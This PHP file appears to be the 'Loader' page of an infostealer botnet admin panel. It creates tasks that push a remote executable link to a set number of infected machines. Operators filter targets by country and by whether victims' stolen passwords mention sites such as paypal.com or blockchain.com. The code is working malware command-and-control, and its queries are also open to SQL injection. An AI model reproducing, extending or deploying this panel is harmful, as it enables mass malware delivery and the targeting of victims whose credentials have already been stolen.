<?php

include_once 'Configs/Main.Config.php';
include_once 'App/Engine.php';

// -------------------------------------------------------------------------
// auth checker
if($_SESSION["login"] != true)
{
	header('Location: login.php', true, 301);
	exit();
}

// -------------------------------------------------------------------------
// rights checker
if($_SESSION["user"]["loader"] ? false : true)
{
	header('Location: dashboard.php', true, 301);
	exit();
}


// -------------------------------------------------------------------------
// read GET requests
$actions = $_GET["action"];

// add rule params
$loader_ruleName 			= $_GET["loader_ruleName"];
$loader_linkToExe 			= $_GET["loader_linkToExe"];
$loader_loadsCount 			= $_GET["loader_loadsCount"];
$loader_allowCountries 		= $_GET["loader_allowCountries"];
$loader_disabledCountries 	= $_GET["loader_disabledCountries"];
$loader_matchPasswords 		= $_GET["loader_matchPasswords"];

// delete rule params
$UID = $_GET["UID"];

// -------------------------------------------------------------------------
// parse requests
switch($actions)
{
	case "add":
		addRule($db, $loader_ruleName, $loader_linkToExe, $loader_loadsCount, $loader_allowCountries, $loader_disabledCountries, $loader_matchPasswords);
		break;
	
	case "delete":
		deleteRule($db, $UID);
		break;
		
	case "modal":
		viewTasks($db);
		break;
		
	case "info":
		viewTaskInfo($db, $UID);
		break;
		
	default:
		break;
}

// -------------------------------------------------------------------------
// add new rule
function addRule($db, $loader_ruleName, $loader_linkToExe, $loader_loadsCount, $loader_allowCountries, $loader_disabledCountries, $loader_matchPasswords)
{
	$CurrentDate = date("Y-m-d H:i:s");
	
	if($loader_ruleName != null & $loader_linkToExe != null & $loader_loadsCount != null)
	{
		if($loader_allowCountries == "null")
		{
			$loader_allowCountries = "*";
		}
		
		if($loader_matchPasswords == "")
		{
			$loader_matchPasswords = "*";
		}
		
		$db->query("INSERT INTO `loader`(`Name`, `Status`, `Link`, `Count`, `Success`, `DateAdded`, `Countries`, `DisabledCountries`, `Domains`) VALUES ('$loader_ruleName','1','$loader_linkToExe','$loader_loadsCount','0','$CurrentDate','$loader_allowCountries','$loader_disabledCountries','$loader_matchPasswords')");
		
		echo "success";
	}
	else
	{
		echo "error";
	}
	
	exit();
}

// -------------------------------------------------------------------------
// delete rule
function deleteRule($db, $UID)
{
	$db->query("DELETE FROM `loader` WHERE `UID`='$UID'");
	echo "success";
	
	exit();
}

// -------------------------------------------------------------------------
// task info modal
function viewTaskInfo($db, $UID)
{
	$task = $db->query("SELECT * FROM `loader` WHERE `UID`='$UID'")->fetch_array();
	
	$percent = calculatePercent($task["Count"], $task["Success"], false);
?>
<table class="table table-striped">
	<tbody>
		<tr>
			<th scope="row">UID</th>
			<td><? echo $task["UID"]; ?></td>
		</tr>
		<tr>
			<th scope="row">Name</th>
			<td><? echo $task["Name"]; ?></td>
		</tr>
		<tr>
			<th scope="row">Status</th>
			<td><? 
			switch($task["Status"])
			{
				case "1":
					echo "In progress";
					break;
					
				case "2":
					echo "Done";
					break;
			}
			?></td>
		</tr>
		<tr>
			<th scope="row">Link</th>
			<td><? echo $task["Link"]; ?></td>
		</tr>
		<tr>
			<th scope="row">Count</th>
			<td><? echo $task["Count"]; ?></td>
		</tr>
		<tr>
			<th scope="row">Success</th>
			<td><? echo $task["Success"]; ?> (<? if($percent == INF){ echo "100"; }else{ echo $percent; } ?>%)</td>
		</tr>
		<tr>
			<th scope="row">Date add</th>
			<td><? echo $task["DateAdded"]; ?> (<?
			
			$startTime = new Datetime($task["DateAdded"]);
			$endTime = new DateTime();
			$diff = date_diff($endTime, $startTime);
			
			if($diff->format('%d') > 0)
			{
				echo $diff->format('%d')."d ";
			}
			if($diff->format('%H') > 0)
			{
				echo $diff->format('%H')."h ";
			}
			if($diff->format('%i') > 0)
			{
				echo $diff->format('%i')."m ";
			}
			if($diff->format('%s') > 0)
			{
				echo $diff->format('%s')."s";
			}
			
			?> ago)</td>
		</tr>
		<tr>
			<th scope="row">Allowed Countries</th>
			<td><?
			
			if($task["Countries"] != "*")
			{
				$countries = explode(",", $task["Countries"]);
				
				foreach ($countries as $_country)
				{
					?><img src="/Template/img/flags/<? echo strtolower($_country); ?>.png"> <? echo $_country; ?>, <?
				}
			}
			else
			{
				echo "All countries";
			}
			
			?></td>
		</tr>
		
		<tr>
			<th scope="row">Disabled Countries</th>
			<td><? 
			
			if($task["DisabledCountries"] != "null")
			{
				$countries = explode(",", $task["DisabledCountries"]);
				
				foreach ($countries as $_country)
				{
					?><img src="/Template/img/flags/<? echo strtolower($_country); ?>.png"> <? echo $_country; ?>, <?
				}
			}
			else
			{
				echo "Nobody countries";
			}

			?></td>
		</tr>
		
		<tr>
			<th scope="row">Match in passwords</th>
			<td><?
			
			if($task["Domains"] != "*")
			{
				echo $task["Domains"];
			}
			else
			{
				echo "All domains";
			}

			?></td>
		</tr>
	</tbody>
</table>
<?
	
	exit();
}

$pageID = "Loader";

// -------------------------------------------------------------------------
// task list modal
function viewTasks($db)
{
	$loader = $db->query("SELECT * FROM `loader` ORDER BY `UID` DESC LIMIT 500;");
	
?>
<table class="table">
	<thead>
		<tr>
			<th scope="col">ID</th>
			<th scope="col">Name</th>
			<th scope="col">Status</th>
			<th scope="col">Link</th>
			<th scope="col">Count</th>
			<th scope="col">Added</th>
			<th scope="col">Actions</th>
		</tr>
	</thead>
	<tbody>
		<? while ($log = $loader->fetch_assoc()) { ?>
		<tr>
			<th style="text-align: left;padding-top: 18px;"><? echo $log["UID"]; ?></th>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["Name"]; ?></td>
			<td style="text-align: left;padding-top: 18px;"><? 
				switch($log["Status"])
				{
					case "1":
						echo "In progress";
						break;
					
					case "2":
						echo "Done";
						break;
				} ?>
			</td>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["Link"]; ?></td>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["Count"]; ?> (<? echo $log["Success"]; ?> success)</td>
			<td style="text-align: left;padding-top: 18px;"><? echo $log["DateAdded"]; ?></td>
			<td style="text-align: left;">
				<div class="dropdown">
					<button class="btn btn-secondary dropdown-toggle" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
					<div class="dropdown-menu">
						<a class="dropdown-item" onclick="viewTaskInfo(<? echo $log["UID"]; ?>);" style="cursor: pointer;" >More info</a>
						<a class="dropdown-item" onclick="deleteTask(<? echo $log["UID"]; ?>);" style="cursor: pointer;" >Delete</a>
					</div>
				</div>
			</td>
		</tr>
		<? } ?>
	</tbody>
</table>
<?
exit();

}

// -------------------------------------------------------------------------
// Countries stats
$countries_stats_array;
$statitics_countries = $db->query("SELECT * FROM `statitics_countries`");

while ($statitics_countries_one = $statitics_countries->fetch_assoc())
{ 
	$countries_stats_array[$statitics_countries_one["Code"]]["Count"] = $statitics_countries_one["Count"];
	$countries_stats_array[$statitics_countries_one["Code"]]["Name"] = $statitics_countries_one["Name"];
}

// -------------------------------------------------------------------------
// page generator

include_once 'Models/Header.php';

?>
<div class="content content-fixed">
	<div class="container pd-x-0 pd-lg-x-10 pd-xl-x-0">
		<div class="d-sm-flex align-items-center justify-content-between mg-b-20 mg-lg-b-25 mg-xl-b-30">
			<div>
				<h4 class="mg-b-0 tx-spacing--1">Loader</h4>
			</div>
			<div class="d-none d-md-block">
				<a onclick="updateTaskList();" >
					<button class="btn btn-sm pd-x-15 btn-white btn-uppercase"><i class="fas fa-sync"></i>  Refresh</button>
				</a>
				<a onclick="createTaskUI();" >
					<button class="btn btn-sm pd-x-15 btn-white btn-uppercase mg-l-5"><i class="fas fa-plus"></i>  Add Task</button>
				</a>
			</div>
		</div>
		
		<div class="row row-xs">
			<div class="col mg-t-10">
				<div class="card card-dashboard-table">
					<div class="table-responsive">
						<div class="viewTasks"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="createTask" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 60%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Create Load Task</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<form id="createTaskForm" action="loader.php" method="POST">
					<div id="wizard1">
						<h3>General</h3>
						<section>
							<br>
							
							<div class="form-group">
								<label for="loader_ruleName" class="d-block">Task name</label>
								<div class="input-group mg-b-10">
									<input type="url" class="form-control" placeholder="First rule" id="loader_ruleName">
								</div>
							</div>
							
							<div class="form-group">
								<label for="loader_linkToExe" class="d-block">Link to file</label>
								<div class="input-group mg-b-10">
									<input type="url" class="form-control" placeholder="http://domain/file.exe" id="loader_linkToExe">
								</div>
							</div>
							
							<div class="form-group">
								<label for="loader_loadsCount" class="d-block">Loads count</label>
								<input id="loader_loadsCount" type="text" class="form-control numeric" placeholder="1000">
							</div>
						</section>
						
						<h3>Countries</h3>
						<section>
							<br>
							
							<div class="form-group">
								<label for="loader_allowCountries" class="d-block">Allowed countries</label>
								<select id="loader_allowCountries" class="form-control select2" multiple="multiple" tabindex="-1" style="width: 100%;">
									<option label="All countries"></option>
									<?
									
									foreach ($countries_stats_array as $key => $val)
									{
										
									?>
									<option value="<? echo $key; ?>"><? echo $key; ?></option>
									<? } ?>
								</select>
							</div>
							
							<div class="form-group">
								<label for="loader_disabledCountries" class="d-block">Disabled countries</label>
								<select id="loader_disabledCountries" class="form-control select2" multiple="multiple" tabindex="-1" style="width: 100%;">
									<option label="Nobody countries"></option>
									<?
									
									foreach ($countries_stats_array as $key => $val)
									{
										
									?>
									<option value="<? echo $key; ?>"><? echo $key; ?></option>
									<? } ?>
								</select>
							</div>
							
						</section>
						
						<h3>Match in passwords</h3>
						<section>
							<br>
							
							<div class="form-group">
								<label for="loader_matchPasswords" class="d-block">Load if in passwords are mentioned:</label>
								<textarea id="loader_matchPasswords" class="form-control" rows="4" placeholder="paypal.com,booking.com,blockchain.com"></textarea>
							</div>
						</section>


					</div>
				</form>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="modalInfo" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 50%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Information about task</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body2">
				
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<script>
$('.viewTasks').load("loader.php?action=modal");

function updateTaskList()
{
	$('.viewTasks').load("loader.php?action=modal");
	
	new Noty({
		timeout: 3500,
		text: 'Success: task list updated',
		type: 'success',
		layout: 'topRight',
		theme: 'bootstrap-v4',
		progressBar: true
	}).show();
};

function viewTaskInfo(id)
{
	var task_url = `loader.php?action=info&UID=${id}`;
	
    $('.modal-body2').load(task_url,function(){
        $('#modalInfo').modal({show:true});
    });
};


function formatCountry (state)
{
	if (!state.id)
	{
		return state.text;
	}
	
	var baseUrl = "/Template/img/flags";
	var $state = $(
		'<span><img src="' + baseUrl + '/' + state.element.value.toLowerCase() + '.png" class="img-flag" /> ' + state.text + '</span>'
	);
	
	return $state;
};

(function($)
{
	'use strict'
	
	var Defaults = $.fn.select2.amd.require('select2/defaults');
	
	$.extend(Defaults.defaults, 
	{
		searchInputPlaceholder: ''
	});
	
	var SearchDropdown = $.fn.select2.amd.require('select2/dropdown/search');
	var _renderSearchDropdown = SearchDropdown.prototype.render;
	
	SearchDropdown.prototype.render = function(decorated) 
	{
		var $rendered = _renderSearchDropdown.apply(this, Array.prototype.slice.apply(arguments));
		this.$search.attr('placeholder', this.options.get('searchInputPlaceholder'));
		
		return $rendered;
	};
	
})(window.jQuery);

$(function()
{
	'use strict'
	
	$('.select2').select2(
	{
		placeholder: 'Select',
		searchInputPlaceholder: 'Search options',
		templateResult: formatCountry,
		dropdownParent: $('#createTask')
	});
});

function createTask()
{
	var loader_ruleName = document.getElementById("loader_ruleName").value;
	var loader_linkToExe = document.getElementById("loader_linkToExe").value;
	var loader_loadsCount = document.getElementById("loader_loadsCount").value;
	var loader_allowCountries = $('#loader_allowCountries').val();
	var loader_disabledCountries = $('#loader_disabledCountries').val();
	var loader_matchPasswords = document.getElementById("loader_matchPasswords").value;
		
	var xhr = new XMLHttpRequest();

	xhr.open('GET', `loader.php?action=add&loader_ruleName=${loader_ruleName}&loader_linkToExe=${loader_linkToExe}&loader_loadsCount=${loader_loadsCount}&loader_allowCountries=${loader_allowCountries}&loader_disabledCountries=${loader_disabledCountries}&loader_matchPasswords=${loader_matchPasswords}`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: task created',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
			$('#createTask').modal('hide');
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: fill task parameters',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		
		$('.viewTasks').load("loader.php?action=modal");
	};
	xhr.send(encodeURI('name'));
};

function createTaskUI()
{
    $('#createTask').modal({show:true});
};

function deleteTask(id)
{
	var xhr = new XMLHttpRequest();

	xhr.open('GET', `loader.php?action=delete&UID=${id}`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: task deleted',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		
		$('.viewTasks').load("loader.php?action=modal");
	};
	xhr.send(encodeURI('name'));
}

$('#wizard1').steps(
{
	headerTag: 'h3',
	bodyTag: 'section',
	autoFocus: true,
	titleTemplate: '<span class="number">#index#</span> <span class="title">#title#</span>'
});

$('.actions a[href=\\#finish]').attr('onclick', 'createTask();');

$(".numeric").numeric({ decimal : ".",  negative : false, scale: 3 });

</script>

<? include_once 'Models/Footer.php'; ?>

</body>
</html>